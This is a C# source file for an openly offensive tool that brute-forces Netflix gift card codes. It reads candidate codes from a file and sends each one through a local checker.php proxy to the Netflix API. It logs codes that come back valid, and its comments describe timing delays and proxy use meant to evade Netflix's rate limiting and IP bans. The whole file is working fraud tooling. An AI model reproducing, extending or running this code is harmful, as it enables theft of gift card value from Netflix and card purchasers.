using System;
using System.IO;
using System.Linq;
using System.Net;

//With this tool you could brute force Netflix gift cards without the usage of using proxies.
//This tool can only work with the checker.php file which includes the CURL request that access Netflix API.

namespace Netflix_Gift_Checker
{
    class Worker
    {
        public void worker1()
        {
            //Program developed by MixBanana aka Sahar.
            var readcodes = File.ReadAllLines("codes.txt");
            //var proxies = File.ReadAllLines("proxies.txt");

            string Data = string.Empty; //V2

            for (var i = 0; i < readcodes.Length; i += 1)
            {
                System.Threading.Thread.Sleep(10000); //Check only every 10 secs - Bypass Netflix checker.

                var codestring = readcodes[i];
                //var proxystring = proxies[i];					

                string Site = "http://127.0.0.1/www/love/checker.php?code=" + codestring /*+ "&proxy=" + proxystring*/; //V2
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Site); //V2
                                                                                  /* V2 */
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    Data = reader.ReadToEnd();
                }

                //Console.WriteLine(Data);

                Console.WriteLine("Checking: " + codestring /*+  " with Proxy: " + proxystring*/+ "\n");

                if (Data.Contains("single_use_code_is_invalid"))
                {
                    Console.WriteLine("single_use_code_is_invalid\n", codestring + /*" Proxy: "+proxystring +*/ "\r\n");
                    File.AppendAllText("Logs/invalid.txt", codestring + "\r\n");
                    File.WriteAllLines("codes.txt", File.ReadLines("codes.txt").Where(l => l != codestring).ToList());
                }
                else if (Data.Contains("RETAIL_CODE"))
                {
                    File.AppendAllText("Logs/worked.txt", codestring + "\r\n");
                    Console.Write("Gift card found: " + codestring + " please check worked.txt file!\n");
                }
                else if (Data.Contains("purchasePrice"))
                {
                    File.AppendAllText("Logs/worked.txt", codestring + "\r\n");
                    Console.Write("Gift card found: " + codestring + " please check worked.txt file!\n");
                }
                else if (Data.Contains("Netflix Site Error"))
                {
                    Console.WriteLine("Your IP address has been banned, Please change your IP!\n");
                    //File.AppendAllText("Logs/ipban.txt", proxystring + "\r\n");
                    //File.WriteAllLines("aliveproxies.txt", File.ReadLines("proxies.txt").Where(l => l != proxystring).ToList());						
                }
                else
                {
                    Console.WriteLine("Error or maybe gift card found, please check the file check.txt\n");
                    File.AppendAllText("Logs/check.txt", codestring + "\r\n");
                    File.WriteAllLines("codes.txt", File.ReadLines("codes.txt").Where(l => l != codestring).ToList());
                }
            }
        }
    }

    //public void worker2()
    //{
    //    var readcodes = File.ReadAllLines("codes.txt");
    //    //var proxies = File.ReadAllLines("proxies.txt");

    //    string Data = string.Empty; //V2

    //    for (var i = 0; i < readcodes.Length; i += 1)
    //    {
    //        System.Threading.Thread.Sleep(10000); //Check only every 10 secs - Bypass Netflix checker.

    //        var codestring = readcodes[i];
    //        //var proxystring = proxies[i];					

    //        string Site = "http://127.0.0.1/love/unlike.php?code=" + codestring /*+ "&proxy=" + proxystring*/; //V2
    //        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Site); //V2
    //                                                                          /* V2 */
    //        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
    //        using (Stream stream = response.GetResponseStream())
    //        using (StreamReader reader = new StreamReader(stream))
    //        {
    //            Data = reader.ReadToEnd();
    //        }

    //        //Console.WriteLine(Data);

    //        Console.WriteLine("Checking: " + codestring /*+  " with Proxy: " + proxystring*/+ "\n");

    //        if (Data.Contains("single_use_code_is_invalid"))
    //        {
    //            Console.WriteLine("single_use_code_is_invalid\n", codestring + /*" Proxy: "+proxystring +*/ "\r\n");
    //            File.AppendAllText("Logs/invalid.txt", codestring + "\r\n");
    //            File.WriteAllLines("codes.txt", File.ReadLines("codes.txt").Where(l => l != codestring).ToList());
    //        }
    //        else if (Data.Contains("RETAIL_CODE"))
    //        {
    //            File.AppendAllText("Logs/worked.txt", codestring + "\r\n");
    //            Console.Write("Gift card found: " + codestring + " please check worked.txt file!\n");
    //        }
    //        else if (Data.Contains("purchasePrice"))
    //        {
    //            File.AppendAllText("Logs/worked.txt", codestring + "\r\n");
    //            Console.Write("Gift card found: " + codestring + " please check worked.txt file!\n");
    //        }
    //        else if (Data.Contains("Netflix Site Error"))
    //        {
    //            Console.WriteLine("Your IP address has been banned, Please change your IP!\n");
    //            //File.AppendAllText("Logs/ipban.txt", proxystring + "\r\n");
    //            //File.WriteAllLines("aliveproxies.txt", File.ReadLines("proxies.txt").Where(l => l != proxystring).ToList());						
    //        }
    //        else
    //        {
    //            Console.WriteLine("Error or maybe gift card found, please check the file check.txt\n");
    //            File.AppendAllText("Logs/check.txt", codestring + "\r\n");
    //            File.WriteAllLines("codes.txt", File.ReadLines("codes.txt").Where(l => l != codestring).ToList());
    //        }
    //    }
    //}
}
